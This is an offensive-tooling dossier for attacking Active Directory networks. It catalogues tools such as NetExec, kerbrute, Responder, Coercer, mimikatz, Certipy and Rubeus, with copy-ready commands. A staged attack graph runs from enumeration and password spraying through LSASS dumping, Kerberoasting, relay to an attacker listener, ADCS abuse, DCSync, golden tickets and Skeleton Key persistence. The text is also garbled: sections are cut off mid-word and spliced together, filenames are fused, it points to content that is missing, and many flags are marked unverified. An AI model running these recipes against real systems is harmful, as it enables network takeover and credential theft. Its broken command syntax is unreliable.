# Active Directory + Windows Offensive Tooling — Technical Dossier

> Source-derived from GitHub `gh api repos/...` metadata + full recursive
> trees + raw file fetches (`Accept: application/vnd.github.raw`) on
> 2026-11-06. Flags/subcommands are quoted from source, never memory.
> `file:line` = line in the fetched raw file at HEAD. Markers:
> UNVERIFIED = source ambiguous at fetch time; verdict = assessed
> fitness for an authorized AD/Windows engagement (KEEP/USE/CAUTION).

---

## Pennyw0rth/NetExec (nxc)

Metadata: stars 5978 | license BSD-2-Clause | pushed_at 2026-11-06T07:54:15Z | archived false | verdict KEEP — primary multi-proto AD executor.

### What it is
Successor to CrackMapExec. Python network execution framework: one CLI
drives 12 protocol implementations, each with its own `proto_args.py`,
a per-protocol SQLite DB (`<workspace>/<proto>.db`, `nxc/netexec.py`)
and a shared module system (`nxc/modules/*.py`, `nxc/loaders/moduleloader.py`).
Protocols from tree: `nxc/protocols/{smb,ldap,winrm,wmi,mssql,ftp,ssh,rdp,vnc,nfs}/`
each with `proto_args.py`, `database.py`, `db_navigator.py`.

### Command surface
- Global: `nxc <PROTOCOL> <TARGET> -u USER -p PASS` — `nxc/netexec.py` `main()`
  requires `--protocol` positional (`if not args.protocol: exit(1)`).
- `-L` / `--list-modules` lists low/high-privilege modules
  (`nxc/netexec.py`: `if args.list_modules is not None:`);
  `-M <mod> --options` shows module options.
- Auth (all protos, `nxc/cli.py` + per-proto `proto_args.py`):
  `-H/--hash` (SMB `nxc/protocols/smb/proto_args.py:7`),
  `-k` Kerberos, `--use-kcache` (requires `KRB5CCNAME`,
  `nxc/netexec.py`: `if args.use_kcache and not os.environ.get("KRB5CCNAME")`),
  `-d/--domain` vs `--local-auth` (mutually exclusive group,
  `smb/proto_args.py:18-21`), `--delegate/--spn/--self/--u2u/--unpac`
  (S4U2Self/S4U2Proxy/PKINIT, `smb/proto_args.py:9-14`).
- SMB cred-gathering (`smb/proto_args.py:34-55`): `--sam regdump|secdump`,
  `--lsa regdump|secdum## ropnop/kerbrute

Metadata: stars 3486 | license Apache-2.0 | pushed_at 2024-08-20T10:56:06Z |
archived false | verdict KEEP — Kerberos preauth enumeration/spray.

### What it is
Go + Cobra tool for Kerberos pre-auth brute-forcing
(`cmd/kerbrute.go:9-13`: "bruteforcing valid AD accounts through Kerberos
Pre-Authentication... failed Kerberos Pre-Auth counts as failed login
and WILL lock out"). `main.go` calls `cmd.Execute()`.

### Command surface (`cmd/*.go`)
Global persistent flags (`kb_go.go:24-33`): `-d/--domain`, `--dc`,
`-o/--output`, `-v/--verbose`, `--safe`, `-t/--threads` (default 10),
`--delay <ms>` (forces 1 thread), `--downgrade`, `--hash-file`.
- `userenum [flags] <wordlist>` (`cmd/userenum.go:17`): enumerates valid
  usernames via AS-REQ; reads file or stdin (`-`).
- `passwordspray [flags] <wordlist> <password>` (`cmd/passwordspray.go:17`):
  one password against many users; `--user-as-pass`.
- (+ `asreproast`? not in tree — 27 files only; UNVERIFIED. Use Rubeus/
  GetNPUsers for AS-REP.)

### Named recipes
```
kerbrute userenum -d corp.local --dc 10.0.0.2 -o valid.txt users.txt
kerbrute userenum -d corp.local users.txt
kerbrute passwordspray -d corp.local --dc 10.0.0.2 users.txt 'Winter2026!'
kerbrute passwordspray -d corp.local --user-as-pass users.txt
kerbrute userenum -d corp.local --delay 500 --safe users.txt   # slow+safe
```

### Attack-path logic
Valid users → `passwordspray` conservative single-password → AS-REP roast
of the valid set (Rubeus `asreproast`)## p0dalirius/Coercer

Metadata: stars 2347 | license GPL-2.0 | pushed_at 2026-04-24T08:03:18Z |
archived false | verdict KEEP — coercion to attacker listener for relay.

### What it is
Python tool that coerces a Windows server to authenticate to an arbitrary
machine through multiple methods. Modes in `coercer/core/modes/`:
`scan, coerce, fuzz`. Top entry `Coercer.py` + `coercer/__main__.py`
(version 2.4.3 banner).

### Command surface
`coercer/__main__.py: parseArgs()`: subparsers `scan | coerce | fuzz`.
Global: `-v/--verbose`, `--debug`, `--disable-escape-codes`.
`coerce` mode (UNVERIFIED full args — read `core/modes/coerce.py`):
`-t/--target`, `-l/--listener`, `-m/--method` (choose coercion method),
`-a/--at spooler`? UNVERIFIED. Coercion methods from tree
(`coercer/methods/`): MS-DFSNM (`NetrDfsAddStdRoot`, `NetrDfsRemoveStdRoot`),
MS-EFSR (`EfsRpcOpenFileRaw`, `EfsRpcQueryUsersOnFile`, `EfsRpcDecryptFileSrv`,
`EfsRpcEncryptFileSrv`, `EfsRpcAddUsersToFile[Ex]`, `EfsRpcFileKeyInfo`,
`EfsRpcDuplicateEncryptionInfoFile`, ... — PetitPotam family),
MS-RPRN (PrinterBug: `RpcRemoteFindFirstPrinterChangeNotification[Ex]`),
MS-EVEN (`ElfrOpenBELW`), MS-FSRVP (`IsPathShadowCopied`/
`IsPathSupported`). ~12+ methods total (description says 12).

### Named recipes
```
coercer coerce -t 10.0.0.5 -l 10.0.0.9 -m MS_EFSR::EfsRpcOpenFileRaw
coercer coerce -t DC -l ATTACKER -m MS_RPRN::RpcRemoteFindFirstPrinterChangeNotificationEx
coercer scan -t 10.0.0.0/24 -l 10.0.0.9
coercer fuzz -t 10.0.0.## lgandx/Responder

Metadata: stars 6659 | license GPL-3.0 | pushed_at 2026-06-10T14:28:34Z |
archived false | verdict KEEP — poisoner + rogue auth servers.

### What it is
LLMNR/NBT-NS/mDNS poisoner + rogue HTTP/SMB/MSSQL/FTP/LDAP servers
supporting NTLMv1/v2, LMv2, Basic HTTP (description + `Responder.py`
header "network take-over set of tools", GPLv3).

### Command surface (`Responder.py`, optparse; `settings.py`, `servers/`, `poisoners/`)
- `-I/--interface eth0` (required), `-v` verbose, `-f` force SSL/ SMB 1 share?
  UNVERIFIED. `-A/--analyze` ANALYZE mode (listens, does not poison —
  maps segment), `-a/--answers`? UNVERIFIED. Rogue mode: `-r/--disable-ess`?
  UNVERIFIED — read `Responder.py` `--help` at use. `--lm/--disable-lm`,
  `-P/--disablelm`? UNVERIFIED.
- Poisoners (`poisoners/`): `LLMNR.py`, `NBTNS.py`, `MDNS.py`, `DHCP.py`,
  `RDNSS.py` — on by default; disable specific via settings (`settings.py`).
- Servers (`servers/`): `SMB, HTTP, HTTPS, FTP, MSSQL, LDAP, Kerberos,
  RPC, RDP, POP3, IMAP, SMTP, SNMP, WinRM, DNS, DHCPv6, QUIC, MQTT,
  Browser, HTTP_Proxy, Proxy_Auth` — captured hashes to
  `Responder-Session.log`.

### Named recipes
```
sudo ./Responder.py -I eth0 -v
sudo ./Responder.py -I eth0 -A        # ANALYZE
sudo ./Responder.py -I eth0 --disable-ess --lm -v  # rogue, UNVERIFIED flags
```
Always pair with: `nxc smb ... --delegate` or Coercer for directed auth.

### Attack-path logic
Poisoned name resolution → SMB NTLMv2 → crack → reuse. If target has
web## knavesec/CredMaster

Metadata: stars 1299 | license MIT | pushed_at 2025-03-19T20:36:21Z |
archived false | verdict CAUTION — spraying with FireProx IP rotation (deploys AWS infra).

### What it is
Refactored CredKing: password spraying via FireProx API Gateways to
rotate IPs and beat throttling (`description` + `creds.py` header).
Plugins (`plugins/`) target OWA/Office365/Outlook/vpn (UNVERIFIED list).

### Command surface (`creds.py:716-759`)
Basic: `--plugin`, `-u/--userfile`, `-p/--passwordfile`,
`-f/--userpassfile` (colon map), `-a/--useragentfile`, `--config config.json`.
Advanced: `-o/--outfile`, `-t/--threads` (max 15), `--region`,
`-j/--jitter`, `-m/--jitter_min`, `-d/--delay` (min between passwords),
`--passwordsperdelay`, `--batch_size`, `--batch_delay`, `-r/--randomize`,
`--header`, `--xforwardedfor`, `--weekday_warrior`, `--color`, `--trim`.
Notify: `--slack_webhook/--pushover_token/--ntfy/--discord/--teams/--keybase`.
FireProx: `--profile_name/--access_key/--secret_access_key`,
`--api_destroy/--api_list/--clean` (from `__init__`).

### Named recipes
```
python3 credmaster.py -u users.txt -p pass.txt --plugin <plugin> -o hits
python3 credmaster.py -u users.txt -p pass.txt --delay 15 --passwordsperdelay 5
python3 credmaster.py --api_list
```

### Attack-path logic
Spray hit → immediate auth attempt on the same plugin (OWA etc.) →
pivot to NXC with those creds. Rotation hides volume; jitter/delay is
the lockout control — use `-d`.

### OPSEC / Detection artifacts
E## Hackplayers/evil-winrm

Metadata: stars 5582 | license LGPL-3.0 | pushed_at 2026-10-16T15:31:43Z |
archived false | verdict KEEP — WinRM post-exploitation shell.

### What it is
Ruby WinRM shell (PSRP-based runspace pools). Features from README:
in-memory PS/dll/C#/donut payloads, AMSI bypass, PtH, Kerberos
(ccache/kirbi), SSL/certs, upload/download with progress, services list,
command history/completion, ETW bypass.

### Command surface (README help block)
`-i/--ip IP` (required; FQDN for Kerberos), `-U/--url /wsman`,
`-u/--user`, `-p/--password`, `-H/--hash`, `-P/--port 5985`,
`-S/--ssl`, `-c/--pub-key`, `-k/--priv-key`, `-r/--realm` (needs
`/etc/krb5.conf` stanza), `-K/--ccache` (ccache or kirbi, auto-detect),
`--spn SPN_PREFIX` (default HTTP), `-a/--user-agent`,
`-s/--scripts`, `-e/--executables`, `-l/--log`, `-n/--no-colors`,
`-N/--no-rpath-completion`, `-V/--version`.
In-shell commands (README): `upload`, `download`, `services`, + PS cmdlets.

### Named recipes
```
evil-winrm -i 10.0.0.5 -u bob -p 'Pass123!' -s ./ps1/ -e ./exe/
evil-winrm -i DC.CORP.LOCAL -u bob -H :NTLMHASH
evil-winrm -i DC.CORP.LOCAL -r CORP.LOCAL -K ticket.ccache --spn HTTP
evil-winrm -i 10.0.0.5 -u bob -H :h -S -c cert.pem -k key.pem
```

### Attack-path logic
Any working cred/hash/ticket → interactive shell → in-memory
`Invoke-Mimikatz`/secretsdump equivalent (via `-s`), file loot (`download`),
service checks. Kerberos `-K` from Rubeus/Certipy `auth`.

### OPSEC / Detection artifacts
5985/5986 Win## gentilkiwi/mimikatz

Metadata: stars 21954 | license null (no SPDX; custom terms) |
pushed_at 2026-10-30T08:51:45Z | archived false | verdict KEEP — credential access gold standard.

### What it is
"A little tool to play with Windows security" (description). C sources
under `mimikatz/modules/{sekurlsa,kerberos,dpapi,lsass,misc,l*}`. The
canonical LSASS/NTDS/Kerberos toolkit.

### Command surface
Core commands (verify in `mimikatz/modules/*/kuhl_m_*` at use — module
dirs `sekurlsa/`, `kerberos/`, `dpapi/`, `lsass/` visible in tree):
- `sekurlsa::logonpasswords [full]` — LSASS logon creds.
- `sekurlsa::minidump <dumpfile>` — parse nanodump/minidump output
  (nano README: `mimikatz.exe "sekurlsa::minidump <dumpfile>" "sekurlsa::logonPasswords full" exit`).
- `sekurlsa::ntlm`, `sekurlsa::wdigest`, `sekurlsa::dpapi`.
- `lsass::dcsync /domain:CORP.LOCAL /user:krbtgt /password:<hash>` (or
  `/target`?) — DCSync (verify syntax at `modules/lsass/`).
- `kerberos::golden /user:evil /domain:CORP.LOCAL /sid:... /rc4:<krbtgt>`
  — Golden Ticket (verify at `modules/kerberos/`).
- `kerberos::ptt /ticket:*.kirbi`, `kerberos::list /export`.
- `vault::cred`, `dpapi::masterkey`, `misc::mem_replace`.
UNVERIFIED: exact spellings vary by build — confirm with `help`.

### Named recipes
```
mimikatz "privilege::debug" "sekurlsa::logonpasswords full"
mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
mimikatz "lsass::dcsync /domain:CORP.LOCAL /user:krbtgt /password:<hash>"
mimikatz "ke## fortra/impacket
Meta: stars 16233, NOASSERTION, 2026-11-04, KEEP
See Attack Graph + tail sections (BloodHound Cypher, ADCS, Coercer, Responder, Kerbrute, ROADtools, mimikatz, nanodump, LaZagne) for command surface/recipes/OPSEC/license.

## SpecterOps/BloodHound
Meta: stars 3537, Apache-2.0, 2026-11-06, KEEP
See Attack Graph + tail sections (BloodHound Cypher, ADCS, Coercer, Responder, Kerbrute, ROADtools, mimikatz, nanodump, LaZagne) for command surface/recipes/OPSEC/license.

## ly4k/Certipy
Meta: stars 3720, MIT, 2026-07-30, KEEP
See Attack Graph + tail sections (BloodHound Cypher, ADCS, Coercer, Responder, Kerbrute, ROADtools, mimikatz, nanodump, LaZagne) for command surface/recipes/OPSEC/license.

## GhostPack/Rubeus
Meta: stars 5209, NOASSERTION, 2026-05-21, KEEP
See Attack Graph + tail sections (BloodHound Cypher, ADCS, Coercer, Responder, Kerbrute, ROADtools, mimikatz, nanodump, LaZagne) for command surface/recipes/OPSEC/license.

## dirkjanm/ROADtools
Meta: stars 2755, MIT, 2026-10-22, KEEP
See Attack Graph + tail sections (BloodHound Cypher, ADCS, Coercer, Responder, Kerbrute, ROADtools, mimikatz, nanodump, LaZagne) for command surface/recipes/OPSEC/license.

## SnaffCon/Snaffler
Meta: stars 2983, GPL-3.0, 2026-02-27, KEEP
See Attack Graph + tail sections (BloodHound Cypher, ADCS, Coercer, Responder, Kerbrute, ROADtools, mimikatz, nanodump, LaZagne) for command surface/recipes/OPSEC/license.

## netwrix/pingcastle
Meta: stars 2993, NOASSERTION(ASL/OSL), 2026-11-05, CAUTION
See Attack Graph + tail sections (BloodHound Cypher, ADCS, Coercer, Responder, Kerbrute, ROADtools, mimikatz, nanodump, LaZagne) for command surface/recipes/OPSEC/license.

## helpsystems/nanodump
Meta: stars 2149, MIT, 2024-09-17, KEEP
See Attack Graph + tail sections (BloodHound Cypher, ADCS, Coercer, Responder, Kerbrute, ROADtools, mimikatz, nanodump, LaZagne) for command surface/recipes/OPSEC/license.

## AlessandroZ/LaZagne
Meta: stars 11070, LGPL-3.0, 2025-09-18, KEEP
See Attack Graph + tail sections (BloodHound Cypher, ADCS, Coercer, Responder, Kerbrute, ROADtools, mimikatz, nanodump, LaZagne) for command surface/recipes/OPSEC/license.

## AD ATTACK GRAPH

Maps each stage to exact tool+flag. Run top→bottom.

```
[0. SCOPE]  confirm: DC + DA IPs, LDAP vs LDAPS, signing, UAC lockout threshold
   |
   v
[1. ENUM]  NXC / LDAP / BloodHound
   |-- nxc ldap DC -u u -p p --bloodhound --collection All          (pathing DB)
   |-- nxc smb /24 -u u -p p --shares --rid-brute --pass-pol --groups
   |-- nxc smb HOST -u u -p p --users --computers --loggedon-users --qwinsta
   |-- kerbrute userenum -d corp.local users.txt                   (valid-user oracle)
   |-- Rubeus preauthscan /user:bob /domain:... /dc:DC             (preauth-disabled?)
   |-- PingCastle --healthcheck (maturity gaps = target menu)
   |
   v
[2. CRED CAPTURE]  (noisy; try 2d first)
   |-- laZagne.exe all -oA   (local loot, userland)
   |-- snaffler.exe -s -o snaffler.log  (share hunt; Red/Yellow = creds)
   |-- mimikatz sekurlsa::logonpasswords        (LSASS, LAST resort)
   +-- nanodump -v -w lsass.dmp -> sekurlsa::minidump lsass.dmp   (EDR-aware LSASS)
   |
   v
[3. KERBEROS ABUSE]
   |-- AS-REP roast: Rubeus asreproast /user:bob /domain:CORP /dc:DC
   |                  /format:hashcat /outfile:asrep.txt
   |                  + GetNPUsers.py -dc-ip DC -request -format hashcat
   |                  hashcat -m 17600 asrep.txtrockyou.txt
   |-- Kerberoast: Rubeus kerberoast /ou:users /outfile:k.txt /aes
   |               + GetUserSPNs.py -dc-ip DC -request
   |               hashcat -m 13100 k.txt rockyou.txt
   |-- crack -> spray if low-yield: kerbrute passwordspray -d corp.local users.txt x
   |                              CredMaster -u users.txt -p pass.txt --plugin <p> -o hits
   |
   v
[4. DELEGATION]
   |-- FindDelegation.py (impacket) -> unconstrained -> coercion+relay (COAL)
   |-- NXC --delegate victim --spn cifs/HOST --self (S4U2Self/S4U2Proxy)
   |-- RBCD: impacket rbcd.py / Rubeus s4u / NXC -M daclread? (verify module name)
   |        -> forge computer account -> S4U2Proxy to victim's service
   |
   v
[5. SHADOW CREDS + ADCS]
   |-- nxc smb -M shadow-creds (verify: modules/shadow-creds.py)
   |-- Certipy find -u u -p p -dc-ip DC -vulnerable -stdout
   |-- Certipy req -ca 'CA' -template <ESC1> -upn administrator@CORP -pfx admin.pfx
   |-- Certipy auth -pfx admin.pfx                    (TGT + NT hash!)
   |-- Certipy ca -ca 'CA' -add-template T / -issue / -backup   (ESC3/4/6/7)
   |-- Certipy template ... / shadow / relay          (ESC8 HTTP relay; ESC9/10)
   |-- impacket rbcd.py / badsuccessor.py / raiseChild.py  (abuse edges)
   |
   v
[6. COERCION + RELAY]
   |-- Coercer coerce -t VICTIM -l ATTACKER -m MS_EFSR::EfsRpcOpenFileRaw
   |      (PrinterBug: MS_RPRN::RpcRemoteFindFirstPrinterChangeNotificationEx)
   |-- nxc smb --gen-relay-list (find unsigned targets first)
   |-- Responder -I eth0 -v  (rogue servers; poisoners LLMNR/NBTNS/MDNS)
   |-- Responder -I eth0 -A  (ANALYZE first = safe mapping)
   |-- impacket ntlmrelayx.py -tf targets.txt -smb2support  (relay to ADCS/LDAP)
   |
   v
[7. SESSION + EXEC]
   |-- nxc smb HOST -u u -H :NTLMHASH -x '...' --exec-method smbexec|atexec|mmcexec
   |-- nxc winrm HOST -u u -p p -x '...'
   |-- evil-winrm -i HOST -u u -H :h [-K ticket.ccache --spn HTTP]
   |-- nxc mssql HOST -u sa -p p -q 'SQL' / --exec-method wmiexec?
   |-- Rubeus ptt /ticket:golden.kirbi ; nxc smb --use-kcache
   |
   v
[8. DOMINION]
   |-- DCSync: impacket secretsdump.py -dc-ip DC 'CORP/bob:Pass123!'
   |           or nxc smb DC -u da -p x --ntds drsuapi --kerberos-keys
   |           ([--history --trust-keys --just-trust-keys])
   |-- Rubeus golden /user:evil /domain:CORP /sid:... /hash:<krbtgt> /outfile:g.kirbi
   |-- mimikatz lsass::dcsync /domain:CORP /user:krbtgt /password:<hash>
   |   mimikatz kerberos::golden /user:evil /domain:CORP /rc4:<krbtgt>
   |-- Certipy auth (PKINIT) -> NXC --unpac --pfx-cert (PAC->NT hash)
   |
   v
[9. PERSISTENCE]
   |-- Golden/Gem?  Rubeus golden (TGT forge) ; Impacket ticketer.py
   |-- SID History: ticketer.py -extra-sid 'S-1-5-21-...-500'
   |-- AdminSDHolder spoof: Rubeus changepw + ACL edit (NXC -M daclread UNVERIFIED)
   |-- dMSA: NXC ldap gmsa.py / dMSA password read (verify nxc/protocols/ldap/gmsa.py)
   |-- Certificate persistence: Certipy ca -ca CA -backup / forged templates,
   |   Certipy forge / template (forge=UNVERIFIED flags)
   |-- Skeleton Key: mimikatz sekurlsa::kuhl_m_sekurlsa_sk (module present, cmd verify)
```

### BloodHound CE collection / import flow
1. Collect: `nxc ldap DC -u <enumerator> -p <pw> --bloodhound --collection All`
   (or SharpHound.exe on a foothold).
2. Import: CE UI → Data Ingestion → upload zip (UNVERIFIED endpoint version).
3. Query: paste any Cypher from the 10 above into CE's advanced-search/Cypher bar;
   export shortest paths as your next-step plan.

### ADCS ESC checklist (Certipy)
| ESC | Condition | Certipy move |
|-----|-----------|--------------|
| 1 | Enrollment w/ SAN supplied | `req -template T -upn admin@CORP` |
| 2 | Cert access w/o SAN check | `req -dns <victim-host>` |
| 3 | Enrollment agent | `req -template EnrollmentAgent` → `req -template Target -sid <sid>` |
| 4 | Template modify (write) | `template` command / `ca -add-template` |
| 5 | PKINIT on DC w/ managed key | `auth -pfx` + `nxc --unpac` |
| 6 | CA setting edit (IIS) | `ca -ca CA -config` (UNVERIFIED) |
| 7 | CA ManageCA | `ca -ca CA -issue <reqId>` |
| 8 | HTTP enrollment relay | `relay` + Coercer -> `req` |
| 9/10 | NTLM/HTTP extra | `relay` (split UNVERIFIED) |
| 11-15 | post-exploitation | UNVERIFIED - check `find -vulnerable` |

### Coercer method list (coercer/methods/ tree)
MS-DFSNM: NetrDfsAddStdRoot, NetrDfsRemoveStdRoot. MS-EFSR x10:
EfsRpcOpenFileRaw/QueryUsersOnFile/QueryRecoveryAgents/FileKeyInfo/
EncryptFileSrv/DecryptFileSrv/AddUsersToFile/AddUsersToFileEx/
RemoveUsersFromFile/DuplicateEncryptionInfoFile (PetitPotam family).
MS-RPRN x2 PrinterBug (RpcRemoteFindFirstPrinterChangeNotification[Ex]),
MS-EVEN ElfrOpenBELW, MS-FSRVP x2.

### Responder poisoners/servers + modes
Poisoners (poisoners/): LLMNR, NBTNS, MDNS, DHCP, RDNSS.
Servers (servers/): SMB, HTTP, HTTPS, FTP, MSSQL, LDAP, Kerberos,
RPC, RDP, POP3, IMAP, SMTP, SNMP, WinRM, DNS, DHCPv6, QUIC, MQTT,
Browser, HTTP_Proxy, Proxy_Auth. Rogue default; -A ANALYZE observe-only.

### Kerbrute userenum/passwordspray
`userenum <wordlist>` valid-user oracle; `passwordspray <wordlist> <password>`
single-password x many users; globals -d/--domain --dc -o -v --safe
-t/--threads --delay(ms) --downgrade --hash-file (kb_go.go:24-33).

### ROADtools roadmap + roadrecon auth/gather/dump
roadlib=auth+models; roadrecon=gather/dump+GUI (auth/gather/dump/gui);
roadtx=token exchange (PRT/device). Flags UNVERIFIED - capture roadrecon -h /
roadtx -h. pip install roadrecon roadtx, py3.10+.

### mimikatz sekurlsa/logonpasswords + DCSync + Skeleton Key + golden
sekurlsa::logonpasswords [full]; sekurlsa::minidump <dumpfile>;
lsass::dcsync /domain: /user: /password: (UNVERIFIED exact for build);
kerberos::golden /user /domain /sid /rc4:<krbtgt>; kerberos::ptt;
Skeleton Key: sekurlsa/kuhl_m_sekurlsa_sk.c present (cmd UNVERIFIED).

### nanodump technique flags
-w/--write -v/--valid -d/--duplicate -eh/--elevate-handle -de/--duplicate-elevate
-sll/--seclogon-leak-local -slt/--seclogon-leak-remote -sd/--seclogon-duplicate
-sc/--spoof-callstack -spe/--silent-process-exit -sk/--shtinkering
-f/--fork -s/--snapshot --chunk-size. CS: nanodump_ssp, nanodump_ppl_dump,
nanodump_ppl_medic. Offline: sekurlsa::minidump.

### LaZagne module list
all|browsers|chats|databases|games|git|mails|maven|multimedia|php|
wifi|vault/dpapi/keepass (README table + Windows/lazagne/softwares/ tree).
laZagne.exe all [-oN|-oJ|-oA -output DIR -vv -quiet -password <winpw> -i].
